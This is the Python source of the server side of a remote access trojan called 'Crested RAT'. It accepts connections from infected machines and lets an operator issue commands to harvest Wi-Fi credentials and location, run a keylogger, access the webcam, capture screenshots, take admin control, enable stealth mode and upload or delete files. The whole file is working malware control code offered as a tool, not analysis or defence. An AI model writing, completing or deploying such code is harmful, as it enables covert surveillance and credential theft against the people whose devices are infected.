import socket
import threading

# Server configuration
HOST = '0.0.0.0'
PORT = 9999

# Crested RAT Logo
LOGO = """
      CRESTED RAT
   Crested RAT - Remote Access Tool
"""

clients = []  # List to store connected clients

# Modular Functions - Server Side Handlers

def handle_wifi_cred(client_socket):
    print("[*] Requesting Wi-Fi credentials...")
    client_socket.send("wifi_cred".encode())
    response = client_socket.recv(4096).decode()
    print(f"Wi-Fi Credentials: {response}")

def handle_location(client_socket):
    print("[*] Requesting location data...")
    client_socket.send("location".encode())
    response = client_socket.recv(4096).decode()
    print(f"Location: {response}")

def handle_stealth_mode(client_socket):
    print("[*] Activating stealth mode...")
    client_socket.send("stealth_mode".encode())
    response = client_socket.recv(4096).decode()
    print(f"Stealth Mode Status: {response}")

def handle_admin_control(client_socket):
    print("[*] Requesting admin control...")
    client_socket.send("admin_control".encode())
    response = client_socket.recv(4096).decode()
    print(f"Admin Control Status: {response}")

def handle_call_automation(client_socket):
    print("[*] Triggering call automation...")
    client_socket.send("call_automation".encode())
    response = client_socket.recv(4096).decode()
    print(f"Call Automation Response: {response}")

def handle_file_ops(client_socket):
    operation = input("Enter 'upload' or 'delete' for file operations: ").lower()
    print(f"[*] Executing file operation: {operation}")
    client_socket.send(f"file_{operation}".encode())
    response = client_socket.recv(4096).decode()
    print(f"File Operation Response: {response}")

def handle_keylogger(client_socket):
    print("[*] Starting keylogger...")
    client_socket.send("keylogger".encode())
    response = client_socket.recv(4096).decode()
    print(f"Keylogger Output: {response}")

def handle_webcam_access(client_socket):
    print("[*] Accessing webcam...")
    client_socket.send("webcam_access".encode())
    response = client_socket.recv(4096).decode()
    print(f"Webcam Status: {response}")

def handle_screenshot(client_socket):
    print("[*] Capturing screenshot...")
    client_socket.send("screenshot".encode())
    response = client_socket.recv(4096).decode()
    print(f"Screenshot Data: {response}")

# Main server loop to accept clients and handle commands

def start_server():
    print(LOGO)  # Display logo on start-up
    print(f"[*] Starting RAT server on {HOST}:{PORT}")

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST, PORT))
    server_socket.listen(5)
    print(f"[*] Listening on {HOST}:{PORT}")

    while True:
        client_socket, client_address = server_socket.accept()
        print(f"[*] Connection from {client_address}")
        
        clients.append(client_socket)
        # Handle each client in a separate thread
        client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
        client_thread.start()

def handle_client(client_socket, client_address):
    while True:
        try:
            # Receive command from server operator
            command = input(f"Enter command for {client_address}: ").lower()

            # Modular command handling
            if command == "wifi_cred":
                handle_wifi_cred(client_socket)
            elif command == "location":
                handle_location(client_socket)
            elif command == "stealth_mode":
                handle_stealth_mode(client_socket)
            elif command == "admin_control":
                handle_admin_control(client_socket)
            elif command == "call_automation":
                handle_call_automation(client_socket)
            elif command == "file_ops":
                handle_file_ops(client_socket)
            elif command == "keylogger":
                handle_keylogger(client_socket)
            elif command == "webcam_access":
                handle_webcam_access(client_socket)
            elif command == "screenshot":
                handle_screenshot(client_socket)
            elif command == "exit":
                client_socket.send("exit".encode())
                client_socket.close()
                clients.remove(client_socket)
                print(f"[*] Disconnected {client_address}")
                break
            else:
                print("[!] Unknown command")

        except Exception as e:
            print(f"[!] Error with {client_address}: {e}")
            client_socket.close()
            clients.remove(client_socket)
            break

if __name__ == "__main__":
    start_server()
